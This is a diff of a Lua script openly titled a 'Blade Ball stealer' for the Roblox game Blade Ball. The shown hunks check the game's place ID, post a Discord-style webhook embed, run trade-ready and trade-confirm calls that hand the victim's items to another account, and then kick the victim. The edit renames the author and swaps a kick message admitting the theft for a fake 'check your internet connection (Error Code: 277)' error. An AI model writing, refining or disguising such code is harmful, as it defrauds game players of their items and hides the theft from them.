@@ -29,7 +29,7 @@ if next(users) == nil or webhook == "" then
 end
 
 if game.PlaceId ~= 13772394625 then
-    plr:kick("Game not supported. Please join a normal Blade Ball server")
+    plr:kick("only work on server normal")
     return
 end
 
@@ -210,7 +210,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Blade Ball stealer by Eblack"
             }
         }}
     }
@@ -418,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
     end
 
     local function waitForUserJoin()
